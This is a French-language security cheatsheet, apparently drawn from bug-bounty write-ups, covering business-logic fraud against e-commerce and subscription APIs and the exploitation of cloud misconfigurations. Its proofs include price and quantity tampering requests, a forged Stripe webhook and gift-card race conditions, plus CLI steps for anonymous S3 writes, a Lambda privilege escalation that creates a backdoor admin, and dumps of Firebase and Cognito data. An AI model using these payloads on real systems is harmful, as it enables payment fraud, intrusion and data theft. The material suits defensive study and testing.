sévérité : critical · CWE-840 · [source](https://academy.logicalbreach.com/writeups/en-exploiting-business-logic-inventory-depletion-via-parameter-tampering-07f6e83a-eecf-43a6-8fb6-dd48e3f72be0)

An event-driven e-commerce platform's cart endpoint (/api/v2/basket/modify_quantity) delegated maximum-quantity validation to the frontend only, letting an attacker inject an arbitrary quantity and reserve the entire venue's inventory in one session. The attacker then submitted the order-finalization request with gw_type set to a free/promotional payment method to skip bank verification, then intercepted and swapped gw_type to a restricted deferred/corporate method that the endpoint accepted without authorization checks — producing a confirmed deferred invoice and depleting the inventory without any real payment.

**Cause racine :** The backend trusted client-supplied cart quantity and payment-method (gw_type) values without re-enforcing server-side maximum-quantity and payment-method-authorization business rules.

**Preuve technique (verbatim depuis la source) :**

```
Phase 1 -- cart limit bypass (frontend-only max-quantity check):
manipulated request to POST /api/v2/basket/modify_quantity injecting a quantity equal to the ENTIRE venue capacity -> backend accepts it with no server-side cap, cart now holds all remaining inventory in a single session.

Phase 2 -- evade the card prompt: intercept the order-setup request and inject a payment-method value equivalent to a free/promotional mode (METHOD_FREE) -> backend skips external bank verification for that flag.

Phase 3 -- final parameter tampering, right before the closing request finalizes the free transaction, swap the payment method for a RESTRICTED corporate method:
POST /api/v2/transaction/init HTTP/1.1
Host: generic-commerce.null.net
Content-Type: application/json

{"cart_id":"xyz-123","gw_type":"METHOD_DEFERRED","accept_tos":true,"contact_email":"attacker@null.net"}

-> server returns 200 OK, issues a deferred invoice under attacker's details, reservation marked 'Confirmed/Pending Payment', thousands of units instantly subtracted from stock -> service flips to 'Sold Out' -- financial DoS with zero real payment, repeatable indefinitely until the deferred-payment timer expires.
```

**Techniques :** parameter-tampering, request-interception, payment-flow-manipulation

**Correspond aux classes qualifiantes :** bfla

**Signal (endpoints/fonctions observés) :**
- `/api/v2/basket/modify_quantity`
- `/api/v2/transaction/init`

**Paramètres impliqués :** `cart_id`, `gw_type`, `accept_tos`, `contact_email`

---

### Quantité négative dans le panier pour générer un total négatif (crédit au lieu d'un débit)

**🧾 Cheatsheet**
sévérité : critical · CWE-1284

En envoyant une quantité négative sur un article du panier, le total de la commande peut devenir négatif si le serveur ne borne pas la valeur à un minimum de 1. Lorsque ce total négatif est ensuite utilisé pour créditer un portefeuille interne, déclencher un remboursement partiel ou compenser une autre ligne du panier, l'attaquant obtient un gain financier au lieu d'un paiement. Le bug provient d'une validation d'entrée absente couplée à une confiance aveugle dans le total recalculé côté client ou mal revalidé côté serveur.

**Cause racine :** L'API de gestion du panier accepte des valeurs de quantité négatives ou nulles sans borne minimale, et le moteur de tarification propage cette valeur négative jusqu'au calcul du montant final sans contrôle de cohérence (total >= 0).

**Preuve technique (verbatim depuis la source) :**

```
// Étape 1 : ajout d'une ligne avec quantité négative
POST /api/cart/items HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...attacker

{"product_id":"SKU-4471","quantity":-5,"price_snapshot":49.99}

-> HTTP/1.1 200 OK
{"cart_id":"c-99231","items":[{"sku":"SKU-4471","quantity":-5,"line_total":-249.95}],"total_amount":-249.95}

// Étape 2 : confirmation avec mode de paiement 'store_credit' compensant le solde négatif
POST /api/checkout/confirm HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"cart_id":"c-99231","payment_method":"store_credit"}

-> HTTP/1.1 200 OK
{"status":"completed","charged_amount":-249.95,"wallet_balance_after":349.94}

// Le total négatif a été traité comme un remboursement automatique crédité sur le wallet interne de l'attaquant.
```

**Techniques :** negative-quantity-injection, integer-underflow, total-price-tampering

**Signal (endpoints/fonctions observés) :**
- `/api/cart/items`
- `/api/cart/add`
- `/api/checkout/update-cart`

**Paramètres impliqués :** `quantity`, `qty`, `item_quantity`

---

### Manipulation du paramètre devise/locale pour exploiter un taux de change en cache obsolète

**🧾 Cheatsheet**
sévérité : high · CWE-682

Certaines plateformes mettent en cache les taux de change pendant plusieurs heures ou jours pour limiter les appels à leur fournisseur de taux, sans réinvalidation lors d'une forte variation. En changeant la devise de la commande juste avant la confirmation finale du paiement, un attaquant peut figer le prix sur un taux de change périmé nettement plus favorable que le taux réel, réduisant artificiellement le montant équivalent payé. L'impact est amplifié sur les commandes de gros montant ou lors de changements de taux post-annonce économique.

**Cause racine :** Le service de conversion de devise met en cache les taux sans horodatage de fraîcheur vérifié à l'étape de paiement, et le changement de devise en fin de tunnel d'achat n'invalide pas le cache ni ne revalide le taux auprès du fournisseur en temps réel.

**Preuve technique (verbatim depuis la source) :**

```
// Le cache de taux n'a pas été rafraîchi depuis 30h alors que le marché a bougé
GET /api/pricing/rates?base=USD HTTP/1.1
Host: shop.example.com

-> HTTP/1.1 200 OK
{"USD_EUR":0.850,"cached_at":"2026-07-06T02:00:00Z"}   // taux réel du marché : 0.930

// L'attaquant a un panier à 100.00 USD déjà validé, et bascule la devise juste avant paiement
PATCH /api/checkout/currency HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"order_id":"ORD-88213","currency":"EUR"}

-> HTTP/1.1 200 OK
{"order_id":"ORD-88213","currency":"EUR","total_amount":85.00,"rate_used":0.850,"rate_locked_at":"2026-07-06T02:00:00Z"}

// Le paiement de 85.00 EUR est confirmé alors que la valeur réelle équivalente (taux du jour 0.930) aurait dû être 93.00 EUR
POST /api/payment/confirm HTTP/1.1
{"order_id":"ORD-88213","amount":85.00,"currency":"EUR"}
-> HTTP/1.1 200 OK {"status":"paid"}
```

**Techniques :** currency-switch-mid-checkout, stale-cache-exchange-rate, locale-tampering

**Signal (endpoints/fonctions observés) :**
- `/api/checkout/currency`
- `/api/cart/set-locale`
- `/api/pricing/convert`

**Paramètres impliqués :** `currency`, `locale`, `country_code`

---

### Prix recalculé côté client accepté sans revalidation serveur à l'étape finale de paiement

**🧾 Cheatsheet**
sévérité : critical · CWE-602

Le prix total à débiter est parfois calculé côté client (JavaScript) puis envoyé tel quel au endpoint de création d'intention de paiement ou de confirmation de commande, sans recalcul serveur à partir du contenu réel du panier et du catalogue. Un attaquant intercepte la requête et remplace le montant par une valeur arbitraire, obtenant un article au prix quasi nul. C'est l'une des failles de logique métier les plus répandues sur les plateformes e-commerce développées rapidement.

**Cause racine :** Le endpoint de paiement fait confiance au champ 'amount'/'total_price' fourni par le client au lieu de recalculer le montant serveur à partir des identifiants produits et des prix catalogue stockés en base.

**Preuve technique (verbatim depuis la source) :**

```
POST /api/payment/create-intent HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...attacker

{"cart_id":"c-55210","line_items":[{"sku":"LAPTOP-PRO-15","unit_price":1299.00,"qty":1}],"amount":1.00,"currency":"USD"}

-> HTTP/1.1 200 OK
{"payment_intent_id":"pi_3Nx7aK","amount_due":1.00,"status":"requires_confirmation"}

POST /api/checkout/confirm HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"payment_intent_id":"pi_3Nx7aK","cart_id":"c-55210"}

-> HTTP/1.1 200 OK
{"order_id":"ORD-90441","status":"paid","amount_charged":1.00,"items":[{"sku":"LAPTOP-PRO-15","qty":1}]}

// Un ordinateur portable à 1299.00 USD a été expédié pour 1.00 USD car le serveur n'a jamais recalculé le montant depuis le catalogue.
```

**Techniques :** client-controlled-price-parameter, price-tampering, trust-boundary-violation

**Correspond aux classes qualifiantes :** mass-assignment

**Signal (endpoints/fonctions observés) :**
- `/api/payment/create-intent`
- `/api/checkout/confirm`
- `/api/orders/create`

**Paramètres impliqués :** `amount`, `total_price`, `unit_price`, `line_items[].price`

---

### Cumul de codes promo au-delà du plafond de réduction prévu par application séquentielle

**🧾 Cheatsheet**
sévérité : medium · CWE-840

Chaque code promo est validé indépendamment (montant minimum, catégorie, date de validité) mais le serveur ne vérifie pas la somme cumulée des réductions appliquées au panier contre un plafond métier global. En appliquant plusieurs codes en séquence via des appels distincts au même endpoint, un attaquant dépasse le taux de réduction maximal prévu, pouvant faire chuter le prix sous le coût de revient. Ce bug est fréquent quand la logique de validation est unitaire par coupon plutôt que globale sur l'état du panier.

**Cause racine :** L'endpoint d'application de coupon valide chaque code isolément sans recalculer ni plafonner la réduction cumulée totale du panier après chaque ajout.

**Preuve technique (verbatim depuis la source) :**

```
POST /api/cart/apply-coupon HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"cart_id":"c-31337","coupon_code":"WELCOME10"}
-> HTTP/1.1 200 OK {"discount_percent":10,"total_discount_percent":10}

POST /api/cart/apply-coupon HTTP/1.1
{"cart_id":"c-31337","coupon_code":"SUMMER15"}
-> HTTP/1.1 200 OK {"discount_percent":15,"total_discount_percent":25}

POST /api/cart/apply-coupon HTTP/1.1
{"cart_id":"c-31337","coupon_code":"LOYALTY20"}
-> HTTP/1.1 200 OK {"discount_percent":20,"total_discount_percent":45}

// Le règlement métier documenté plafonne le cumul à 30% ; aucune vérification globale n'existe côté serveur, le panier atteint 45% de réduction cumulée.
```

**Techniques :** sequential-coupon-stacking, discount-cap-bypass

**Signal (endpoints/fonctions observés) :**
- `/api/cart/apply-coupon`
- `/api/promotions/redeem`

**Paramètres impliqués :** `coupon_code`, `promo_code`

---

### Abus des essais gratuits via plus-addressing e-mail et contournement du fingerprint de carte bancaire

**🧾 Cheatsheet**
sévérité : low · CWE-840

L'éligibilité à un essai gratuit est souvent vérifiée par correspondance exacte de l'adresse e-mail et par empreinte (fingerprint) du moyen de paiement, sans normalisation. En utilisant le plus-addressing (ex: user+1@gmail.com) qui délivre au même compte réel, combiné à des numéros de carte virtuels (cartes jetables liées à la même source de financement mais avec un PAN différent), l'attaquant génère des identités jugées 'nouvelles' par le système alors qu'elles pointent vers la même personne réelle. Cela permet de renouveler indéfiniment des périodes d'essai payantes gratuitement.

**Cause racine :** Le contrôle anti-abus d'essai gratuit compare l'e-mail et l'empreinte de carte sans normaliser le plus-addressing ni détecter les cartes virtuelles rattachées à la même source de financement.

**Preuve technique (verbatim depuis la source) :**

```
POST /api/subscriptions/trial/start HTTP/1.1
Host: saas.example.com
Content-Type: application/json

{"email":"victim+trial1@gmail.com","plan":"premium_monthly","payment_token":"tok_visa_4242_v1"}

-> HTTP/1.1 200 OK {"trial_id":"tr_1","status":"active","trial_end":"2026-07-22"}

// Après expiration/annulation du premier essai, nouvelle identité avec carte virtuelle liée au même compte bancaire
POST /api/subscriptions/trial/start HTTP/1.1
{"email":"victim+trial2@gmail.com","plan":"premium_monthly","payment_token":"tok_visa_4242_v2"}

-> HTTP/1.1 200 OK {"trial_id":"tr_2","status":"active","trial_end":"2026-08-05"}

// gmail.com délivre les deux e-mails à la même boîte, et les deux tokens de carte virtuelle débitent le même RIB source ; le contrôle 'un essai par personne' est contourné indéfiniment.
```

**Techniques :** plus-addressing-email-abuse, card-fingerprint-bypass, disposable-email-trial-farming

**Signal (endpoints/fonctions observés) :**
- `/api/subscriptions/trial/start`
- `/api/billing/payment-methods`

**Paramètres impliqués :** `email`, `payment_token`, `card_fingerprint`

---

### Usurpation du webhook/IPN de paiement pour valider une commande sans paiement réel

**🧾 Cheatsheet**
sévérité : critical · CWE-345

Le endpoint de callback du prestataire de paiement (webhook/IPN) doit vérifier cryptographiquement la signature HMAC du fournisseur avant de considérer un paiement comme confirmé. Quand cette vérification est absente, mal implémentée (comparaison non constante, secret par défaut, vérification uniquement de la présence de l'en-tête) ou contournable, un attaquant peut forger directement un événement 'paiement réussi' vers l'endpoint public du marchand sans jamais avoir payé. La commande est alors marquée payée et expédiée/livrée gratuitement.

**Cause racine :** Le endpoint webhook accepte et traite les événements de paiement sans validation cryptographique stricte de la signature émise par le prestataire de paiement.

**Preuve technique (verbatim depuis la source) :**

```
// Reconnaissance préalable : format d'un évènement 'payment_intent.succeeded' documenté publiquement par le prestataire

POST /webhooks/stripe HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Stripe-Signature: t=1720440000,v1=0000000000000000000000000000000000000000000000000000000000000000

{"id":"evt_fake_001","type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake_99887","amount":149900,"currency":"eur","metadata":{"order_id":"ORD-40021"},"status":"succeeded"}}}

-> HTTP/1.1 200 OK
{"received":true,"order_status":"paid"}

// Le serveur n'a jamais recalculé/vérifié la signature HMAC avec le secret webhook, la commande ORD-40021 est marquée payée et libérée pour expédition sans transaction réelle chez le prestataire.
```

**Techniques :** webhook-spoofing, ipn-forgery, signature-verification-bypass

**Correspond aux classes qualifiantes :** auth-bypass

**Signal (endpoints/fonctions observés) :**
- `/webhooks/payment-provider`
- `/api/ipn/callback`
- `/webhooks/stripe`

**Paramètres impliqués :** `event_type`, `signature`, `payload`

---

### Manipulation du solde de carte cadeau/points de fidélité via race condition ou paramètre de solde non signé

**🧾 Cheatsheet**
sévérité : high · CWE-362

Deux variantes fréquentes permettent de gonfler artificiellement un solde de carte cadeau ou de points de fidélité. La première exploite une absence de verrou transactionnel (TOCTOU) en envoyant de nombreuses requêtes de rachat en parallèle sur le même code, chacune lisant le solde avant qu'une autre ne l'ait décrémenté. La seconde exploite un paramètre de solde renvoyé par le client (ex: 'wallet_balance') que le serveur utilise tel quel au lieu de relire la valeur autoritaire en base de données.

**Cause racine :** L'opération de débit du solde n'est pas atomique (pas de verrou pessimiste / transaction SELECT...FOR UPDATE) et/ou le serveur fait confiance à un champ de solde fourni par le client au lieu de la valeur stockée côté base de données.

**Preuve technique (verbatim depuis la source) :**

```
// Variante 1 : race condition sur une carte cadeau de 50.00 à usage unique, 20 requêtes envoyées en parallèle
POST /api/giftcard/redeem HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...attacker

{"giftcard_code":"GC-XY12-9902","amount":50.00,"cart_id":"c-11220"}

// (envoyée simultanément via un script multi-thread ex: 20x Turbo Intruder / curl en parallèle)
-> 20x HTTP/1.1 200 OK {"status":"redeemed","credited":50.00}
// Total crédité au panier : 1000.00 pour une carte de 50.00 car le solde n'est vérifié/décrémenté qu'après lecture concurrente.

// Variante 2 : paramètre de solde non signé accepté par le serveur
PATCH /api/wallet/apply-credit HTTP/1.1
{"user_id":"u-4471","wallet_balance":50.00,"apply_amount":9999.00}
-> HTTP/1.1 200 OK {"wallet_balance_after":10049.00}
```

**Techniques :** race-condition-toctou, client-controlled-balance-parameter, concurrent-redemption

**Correspond aux classes qualifiantes :** race-condition

**Signal (endpoints/fonctions observés) :**
- `/api/giftcard/redeem`
- `/api/loyalty/balance`
- `/api/wallet/apply-credit`

**Paramètres impliqués :** `balance`, `points`, `giftcard_code`, `amount_to_redeem`, `wallet_balance`

---

### Annulation d'abonnement sans proratisation combinée à une réinscription pour réinitialiser l'offre de bienvenue

**🧾 Cheatsheet**
sévérité : medium · CWE-840

Un utilisateur souscrit un forfait annuel payé intégralement, en consomme plusieurs mois de contenu premium, puis le rétrograde ou l'annule sans qu'aucune proratisation ni pénalité ne soit appliquée. Il se réabonne ensuite immédiatement à une offre 'premier mois offert', le contrôle d'éligibilité à cette offre ne se basant que sur l'absence d'abonnement actif à l'instant T et non sur l'historique complet du compte. Le cycle annulation/réinscription peut être répété pour recycler indéfiniment les avantages promotionnels réservés aux nouveaux clients.

**Cause racine :** Le workflow d'annulation ne calcule pas de proratisation sur la consommation déjà effectuée, et le contrôle 'nouvel abonné' pour les promotions ne vérifie que l'état courant de l'abonnement plutôt que l'historique complet du compte.

**Preuve technique (verbatim depuis la source) :**

```
POST /api/subscriptions/downgrade HTTP/1.1
Host: saas.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...attacker

{"subscription_id":"sub_88213","new_plan_id":"free","effective_date":"immediate"}

-> HTTP/1.1 200 OK
{"status":"downgraded","refund_issued":0.00,"period_end":null}

// Réinscription immédiate avec l'offre de bienvenue
POST /api/subscriptions/create HTTP/1.1
{"plan_id":"premium_monthly","promo_code":"FIRSTMONTHFREE"}

-> HTTP/1.1 200 OK
{"status":"active","trial_applied":true,"charged_amount":0.00}

// L'abonnement premium annuel a été consommé 8 mois sans pénalité, puis l'offre 'premier mois gratuit' recyclée immédiatement.
```

**Techniques :** proration-bypass, promo-reset-via-resubscribe, subscription-lifecycle-abuse

**Signal (endpoints/fonctions observés) :**
- `/api/subscriptions/cancel`
- `/api/subscriptions/downgrade`
- `/api/subscriptions/create`

**Paramètres impliqués :** `subscription_id`, `plan_id`, `effective_date`, `promo_code`

---

### Contournement des frais de livraison par falsification de la zone/adresse après le calcul du montant d'expédition

**🧾 Cheatsheet**
sévérité : medium · CWE-602

Le tunnel d'achat calcule d'abord un devis de livraison (shipping-quote) basé sur une adresse locale bon marché, puis référence ce devis via un 'quote_id' lors de la confirmation finale de commande. Si le serveur ne revalide pas la cohérence entre l'adresse de livraison finale et le devis initial, un attaquant peut changer l'adresse pour une destination lointaine (zone internationale ou intercontinentale bien plus chère) tout en conservant le tarif d'expédition local déjà figé dans le quote_id.

**Cause racine :** Le endpoint de confirmation de commande fait confiance à un identifiant de devis d'expédition émis précédemment sans revérifier sa cohérence avec l'adresse de livraison finale au moment de la validation.

**Preuve technique (verbatim depuis la source) :**

```
// Étape 1 : devis avec adresse locale bon marché
POST /api/checkout/shipping-quote HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"cart_id":"c-20099","address":{"country":"FR","postal_code":"75001"}}

-> HTTP/1.1 200 OK
{"shipping_zone":"ZONE_FR","shipping_cost":4.90,"quote_id":"q-8871"}

// Étape 2 : confirmation avec adresse réelle en zone internationale chère, mais quote_id local conservé
POST /api/orders/create HTTP/1.1
{"cart_id":"c-20099","quote_id":"q-8871","shipping_address":{"country":"NC","postal_code":"98800","city":"Noumea"}}

-> HTTP/1.1 200 OK
{"order_id":"ORD-51002","shipping_cost_charged":4.90,"destination":"Nouvelle-Caledonie"}

// Le tarif intercontinental réel (ex: 45.00) est contourné car quote_id n'est pas revalidé contre l'adresse finale.
```

**Techniques :** shipping-zone-tampering, toctou-price-recalc-bypass

**Signal (endpoints/fonctions observés) :**
- `/api/checkout/shipping-quote`
- `/api/orders/create`
- `/api/checkout/confirm`

**Paramètres impliqués :** `shipping_address`, `zone_id`, `shipping_cost`, `postal_code`, `quote_id`

---

### Abus du remboursement sur un bien numérique déjà consommé sans vérification de l'état de consommation

**🧾 Cheatsheet**
sévérité : medium · CWE-840

Un attaquant achète un bien numérique (ebook, logiciel, contenu vidéo à la demande), le télécharge ou le consomme intégralement, puis déclenche immédiatement une demande de remboursement. Si le endpoint de remboursement ne consulte pas l'état de consommation (compteur de téléchargement, position de lecture, licence activée) avant d'accorder automatiquement le remboursement, l'attaquant obtient le produit gratuitement et peut répéter le cycle avec d'autres comptes ou moyens de paiement.

**Cause racine :** Le workflow de remboursement ne vérifie pas l'état de livraison/consommation du bien numérique (download_count, licence activée, streaming consommé) avant d'accorder automatiquement le remboursement.

**Preuve technique (verbatim depuis la source) :**

```
// Étape 1 : achat puis téléchargement intégral du contenu
GET /api/downloads/asset-77123?order_id=ORD-33210 HTTP/1.1
Host: shop.example.com
Authorization: Bearer eyJhbGciOi...attacker

-> HTTP/1.1 200 OK
Content-Type: application/octet-stream
(contenu binaire complet livre, download_count incremente a 1 cote serveur)

// Étape 2 : demande de remboursement immédiate
POST /api/orders/ORD-33210/refund HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"reason":"not_as_described"}

-> HTTP/1.1 200 OK
{"refund_id":"re_5521","status":"succeeded","amount_refunded":39.99}

// Le endpoint de remboursement n'a jamais consulté le champ download_count avant d'accorder le remboursement automatique.
```

**Techniques :** refund-after-consumption, download-then-refund, consumption-state-not-checked

**Signal (endpoints/fonctions observés) :**
- `/api/orders/{order_id}/refund`
- `/api/downloads/{asset_id}`

**Paramètres impliqués :** `order_id`, `reason`, `asset_id`

---

## Cloud Misconfig — AWS / GCP / Azure

*6 cas.*

### Bucket S3 en écriture publique — defacement/hébergement de payload sur l'infrastructure de la victime

**🧾 Cheatsheet**
sévérité : critical · CWE-284

Un bucket S3 avec une ACL ou une bucket policy autorisant `s3:PutObject` à `Principal: "*"` (souvent introduit par copier-coller d'une policy de test trouvée en ligne, ou une confusion entre 'public read pour un site statique' et 'public write') permet à n'importe qui d'uploader/écraser des fichiers -- sur un bucket servant un site web statique ou du contenu utilisateur via CloudFront, ceci équivaut à un defacement complet ou à l'hébergement de payloads malveillants sous un domaine de confiance.

**Cause racine :** La bucket policy ou l'ACL S3 accorde l'action `s3:PutObject` (et parfois `s3:PutObjectAcl`) au principal `*` (tout le monde) au lieu de la restreindre à des rôles/comptes AWS spécifiques.

**Preuve technique (verbatim depuis la source) :**

```
Détection rapide (AWS CLI en anonyme, sans credentials) :
aws s3 ls s3://target-bucket-name/ --no-sign-request

Test d'écriture (si accessible, tenter un upload anodin de preuve avant tout test destructif) :
echo "poc-test-$(date +%s)" > poc.txt
aws s3 cp poc.txt s3://target-bucket-name/poc-test.txt --no-sign-request
aws s3 ls s3://target-bucket-name/poc-test.txt --no-sign-request  # confirme l'upload réussi

Vérification de la policy exacte (si le bucket expose sa policy publiquement, ou via un compte IAM séparé avec s3:GetBucketPolicy) :
aws s3api get-bucket-policy --bucket target-bucket-name --no-sign-request
# Chercher : "Effect":"Allow","Principal":"*","Action":"s3:PutObject"

Outils d'automatisation de découverte : S3Scanner, Bucket Stream (surveillance continue de nouveaux buckets créés via CT logs), grayhatwarfare (moteur de recherche de buckets publics indexés).
```

**Techniques :** s3-public-write-acl, bucket-policy-misconfiguration

---

### Élévation de privilèges IAM via iam:PassRole combiné à la création d'une fonction Lambda

**🧾 Cheatsheet**
sévérité : critical · CWE-269

Un compte IAM avec les permissions `iam:PassRole` (sans restriction de rôle spécifique) + `lambda:CreateFunction` + `lambda:InvokeFunction` peut s'élever au niveau de privilège de N'IMPORTE QUEL rôle IAM existant dans le compte, même un rôle admin : créer une fonction Lambda qui exécute du code arbitraire, l'attacher au rôle privilégié via PassRole, puis l'invoquer -- le code s'exécute alors AVEC les permissions du rôle attaché, indépendamment des permissions limitées du compte IAM d'origine qui a orchestré tout ça. C'est l'un des chemins de privesc IAM les plus courants et les plus documentés (14+ variantes similaires existent avec d'autres services : EC2, Glue, DataPipeline, CloudFormation).

**Cause racine :** La policy IAM du compte accorde `iam:PassRole` sans condition restrictive (`iam:PassedToService` ou une liste explicite d'ARN de rôles autorisés), permettant de passer N'IMPORTE QUEL rôle du compte à un service capable d'exécuter du code arbitraire pour le compte de ce rôle.

**Preuve technique (verbatim depuis la source) :**

```
Outil de découverte automatique : PMapper ou Cloudsplaining (analysent les policies IAM d'un compte et cartographient les chemins de privesc disponibles).

Exploitation manuelle (une fois iam:PassRole + lambda:* confirmés sur un rôle limité) :
# 1. Créer le code Lambda malveillant qui utilise les credentials du rôle admin passé
cat > lambda_function.py <<'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    return iam.create_user(UserName='backdoor-admin')
EOF
zip function.zip lambda_function.py

# 2. Créer la fonction en lui passant le rôle privilégié via PassRole
aws lambda create-function --function-name privesc-poc \
  --runtime python3.9 --handler lambda_function.handler \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --zip-file fileb://function.zip

# 3. Invoquer -- le code s'exécute avec les permissions d'AdminRole
aws lambda invoke --function-name privesc-poc output.json
```

**Techniques :** iam-passrole-privesc, lambda-role-assumption-chain

**Correspond aux classes qualifiantes :** privilege-escalation

---

### Token SAS Azure Blob Storage sur-permissionné fuité dans une application mobile/JS

**🧾 Cheatsheet**
sévérité : high · CWE-522

Un jeton SAS (Shared Access Signature) Azure hardcodé dans le code client (app mobile décompilée, bundle JS) pour permettre un accès direct au stockage sans passer par le backend est souvent généré avec un scope bien plus large que nécessaire (accès container entier au lieu d'un blob précis, permission d'écriture/suppression au lieu de lecture seule) et une durée de validité longue -- une fois extrait du binaire/bundle, il reste utilisable jusqu'à expiration par QUICONQUE le récupère, sans authentification supplémentaire.

**Cause racine :** Le jeton SAS est généré avec des permissions (`sp=`) et un scope trop larges pour l'usage réel côté client, et embarqué directement dans du code distribué publiquement (APK/IPA décompilable, bundle JavaScript) plutôt que généré à la demande côté serveur avec une durée de vie courte.

**Preuve technique (verbatim depuis la source) :**

```
URL SAS typique trouvée dans un bundle JS ou une APK décompilée (paramètres révélateurs : sp=rwdl = read/write/delete/list, sur tout le container plutôt qu'un blob) :
https://storageaccount.blob.core.windows.net/private-container?sv=2021-06-08&ss=b&srt=c&sp=rwdlacx&se=2027-01-01T00:00:00Z&st=2026-01-01T00:00:00Z&spr=https&sig=<signature>

Exploitation directe avec Azure CLI ou juste curl (le token EST l'authentification, aucune autre credential nécessaire) :
az storage blob list --container-name private-container \
  --account-name storageaccount \
  --sas-token "sv=2021-06-08&ss=b&srt=c&sp=rwdlacx&se=2027-01-01T00:00:00Z&sig=<signature>"

# Si sp contient 'w' ou 'd', tester l'upload/suppression pour confirmer l'impact réel :
az storage blob upload --container-name private-container --name poc.txt --file poc.txt \
  --account-name storageaccount --sas-token "..."

Extraction depuis une APK : apktool d app.apk -o extracted/ puis grep -r 'sig=' extracted/ (ou strings sur le binaire natif si le token est en dur dans du code natif compilé).
```

**Techniques :** azure-sas-token-scope-abuse, hardcoded-sas-in-client

**Paramètres impliqués :** `sig`, `se`, `sp`

---

### Firebase Realtime Database/Firestore avec règles de sécurité laissées en mode test (public)

**🧾 Cheatsheet**
sévérité : critical · CWE-284

Firebase propose par défaut, lors de la création d'un projet, un 'mode test' avec des règles `.read: true, .write: true` valides 30 jours -- délai souvent dépassé en dev/staging mais l'habitude de règles permissives persiste parfois en prod. La configuration Firebase (apiKey, projectId, databaseURL) est TOUJOURS visible côté client (nécessaire au SDK JS pour fonctionner) donc jamais un secret en soi -- ce sont les RÈGLES de sécurité côté serveur qui doivent porter toute la protection, et leur absence rend la base de données entièrement accessible à quiconque connaît juste l'URL du projet.

**Cause racine :** Les règles de sécurité Firebase Realtime Database/Firestore autorisent la lecture et/ou l'écriture sans authentification (`allow read, write: if true;`), un réglage de développement par défaut jamais durci avant la mise en production.

**Preuve technique (verbatim depuis la source) :**

```
Détection/dump direct via l'API REST Firebase (aucune authentification nécessaire si les règles sont ouvertes) :
curl https://PROJECT-ID.firebaseio.com/.json
# Retourne l'INTÉGRALITÉ de la base de données en JSON si les règles sont publiques

Test d'écriture (à faire prudemment, sur un nœud de test dédié, jamais sur des données réelles) :
curl -X PUT -d '{"poc":"test-write-confirmed"}' https://PROJECT-ID.firebaseio.com/security-test.json

Pour Firestore (syntaxe différente, via l'API REST v1) :
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users"

Outil de découverte automatisée de projets Firebase mal configurés : Firebase-Scanner / FireBaseScanner (GitHub, scanne un domaine pour trouver la config Firebase embarquée puis teste les règles).
```

**Techniques :** firebase-open-rules, unauthenticated-database-dump

---

### Cognito Identity Pool avec un rôle non-authentifié sur-permissionné

**🧾 Cheatsheet**
sévérité : high · CWE-269

AWS Cognito Identity Pools permet aux applications mobiles/SPA d'obtenir des credentials AWS temporaires SANS authentification préalable (pour des fonctionnalités publiques comme un catalogue produit) via un 'rôle non-authentifié'. L'Identity Pool ID est nécessairement visible côté client (embarqué dans l'app/le JS). Si le rôle non-authentifié attaché est sur-permissionné (policy trop large copiée depuis un tutoriel, ou héritée d'un rôle authentifié par erreur de configuration), n'importe qui peut obtenir ces credentials et accéder directement aux ressources AWS backend sans jamais s'authentifier.

**Cause racine :** La policy IAM attachée au rôle 'non-authenticated' de l'Identity Pool accorde des permissions plus larges que le strict nécessaire pour un visiteur anonyme (souvent copiée par erreur depuis le rôle authenticated, ou avec des actions `s3:*`/`dynamodb:*` au lieu d'actions granulaires en lecture seule sur des ressources spécifiques).

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- extraire l'Identity Pool ID depuis l'app mobile décompilée ou le bundle JS (format standard : région:UUID) :
grep -r 'IdentityPoolId' extracted_app/ 
# ex: eu-west-1:a1b2c3d4-e5f6-7890-abcd-ef1234567890

Étape 2 -- obtenir des credentials AWS temporaires SANS authentification via l'API Cognito :
aws cognito-identity get-id --identity-pool-id eu-west-1:a1b2c3d4-e5f6-7890-abcd-ef1234567890 --region eu-west-1
# Retourne un IdentityId

aws cognito-identity get-credentials-for-identity --identity-id <IdentityId retourné> --region eu-west-1
# Retourne AccessKeyId, SecretKey, SessionToken temporaires

Étape 3 -- énumérer les permissions réellement accordées avec ces credentials :
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls  # ou dynamodb list-tables, etc. -- tester la surface complète
```

**Techniques :** cognito-unauth-role-abuse, identity-pool-id-leak

**Correspond aux classes qualifiantes :** privilege-escalation

**Paramètres impliqués :** `IdentityPoolId`

---

### Fichier d'état Terraform (.tfstate) exposé publiquement — secrets en clair

**🧾 Cheatsheet**
sévérité : critical · CWE-312

Terraform stocke TOUT l'état de l'infrastructure provisionnée dans un fichier .tfstate, y compris les valeurs de sortie sensibles (mots de passe de base de données générés, clés API créées par un provider, certificats privés) EN CLAIR par défaut, même si ces valeurs sont marquées `sensitive = true` dans le code (ce flag masque seulement l'affichage dans les logs `terraform plan/apply`, pas le contenu réel du fichier d'état). Un bucket S3/Azure Blob de backend Terraform mal configuré en accès public expose donc potentiellement l'intégralité des secrets d'infrastructure d'une organisation en un seul fichier JSON.

**Cause racine :** Le backend de stockage de l'état Terraform (bucket S3, Azure Storage, GCS) est configuré en accès public ou avec des permissions trop larges, et le fichier .tfstate contient nativement les valeurs sensibles en clair car le flag `sensitive` de Terraform n'est qu'une protection d'affichage CLI, pas un chiffrement du fichier d'état lui-même.

**Preuve technique (verbatim depuis la source) :**

```
Découverte (bucket S3 mal configuré, nom souvent prévisible : company-terraform-state, infra-tfstate) :
aws s3 ls s3://company-terraform-state/ --no-sign-request
